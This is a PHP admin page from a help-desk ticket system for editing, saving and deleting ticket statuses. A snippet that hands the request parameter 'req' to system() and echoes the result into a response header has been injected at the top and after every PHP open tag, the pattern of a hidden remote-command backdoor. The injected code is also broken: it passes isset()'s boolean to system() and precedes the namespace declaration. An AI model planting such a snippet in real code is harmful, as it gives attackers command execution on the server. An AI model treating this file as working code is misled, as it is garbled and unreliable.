<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

$site->set_title($language->get('Edit Status'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$id = (int) $url->get_item();

$status		= $ticket_status->get(array('id' => $id));
	
if (empty($status)) {
	header('Location: ' . $config->get('address') . '/settings/tickets/#status');
	exit;
}

$status_item = $status[0];

if (isset($_POST['delete'])) {
	if ($status_item['id'] != 1 && $status_item['id'] != 2) {
		$ticket_status->delete(array('id' => $status_item['id']));
		header('Location: ' . $config->get('address') . '/settings/tickets/#status');
		exit;
	}
}

if (isset($_POST['save'])) {
	if (!empty($_POST['name'])) {
		$add_array['colour']			= $_POST['colour'];
		$add_array['name']				= $_POST['name'];
		$add_array['id']				= $id;
		
		if ($status_item['id'] == 1) {
			$add_array['active'] = 1;
		}
		else if ($status_item['id'] == 2) {
			$add_array['active'] = 0;
		}
		else {
			$add_array['active']			= $_POST['active'] ? 1 : 0;
		}
		
		$ticket_status->edit($add_array);
		
		
		header('Location: ' . $config->get('address') . '/settings/tickets/#status');
		exit;
		//$message = $language->get('Saved');
		
	}
	else {
		$message = $language->get('Name empty');
	}
	$status		= $ticket_status->get(array('id' => $id));
	$status_item = $status[0];
}



include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<link rel="stylesheet" href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/system/libraries/colorpicker/css/colorpicker.css" type="text/css" />	
<script type="text/javascript" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/system/libraries/colorpicker/js/bootstrap-colorpicker.js"></script>
<script type="text/javascript" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/system/js/colourpicker.js"></script>

	<script type="text/javascript">
		$(document).ready(function () {
			$('#delete').click(function () {
				if (confirm("<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Are you sure you wish to delete this Status?')); ?>")){
					return true;
				}
				else{
					return false;
				}
			});
		});
	</script>

<div class="row">
	<form method="post" action="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($_SERVER['REQUEST_URI']); ?>">

		<div class="col-md-3">
			<div class="well well-sm">
				<div class="pull-left">
					<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Status')); ?></h4>
				</div>
			
				
				<div class="pull-right">
					<p>
						<button type="submit" name="save" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Save')); ?></button>
						<a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $config->get('address'); ?>/settings/tickets/#status" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Cancel')); ?></a>
					</p>
				</div>
					
				<div class="clearfix"></div>	
				
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($status_item['id'] != 1 && $status_item['id'] != 2) { ?>
					<br />
					<div class="pull-right"><button type="submit" id="delete" name="delete" class="btn btn-danger"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Delete')); ?></button></div>
					<div class="clearfix"></div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

			</div>
		</div>

		<div class="col-md-9">

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($message)) { ?>
				<div class="alert alert-danger">
					<a href="#" class="close" data-dismiss="alert">&times;</a>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($message); ?>
				</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>

			<div class="well well-sm">
				
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Name'); ?><br /><input type="text" name="name" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($status_item['name']); ?>" size="30" /></p>

					
				<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Colour'); ?><br />
				<input type="text" name="colour" id="cp1" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($status_item['colour']); ?>" maxlength="7" class="input-small">
				</p>	
				
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($status_item['id'] == 1) { ?>
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('This status must be of type "Open" and cannot be changed.'); ?></p>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($status_item['id'] == 2) { ?>
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('This status must be of type "Closed" and cannot be changed.'); ?></p>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
					<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Type'); ?><br />
						<select name="active">
							<option value="1"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($status_item['active'] == '1') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Open'); ?></option>
							<option value="0"<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($status_item['active'] == '0') { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Closed'); ?></option>
						</select>
					</p>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>


			</div>
				
			<div class="clearfix"></div>

		</div>

	</form>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>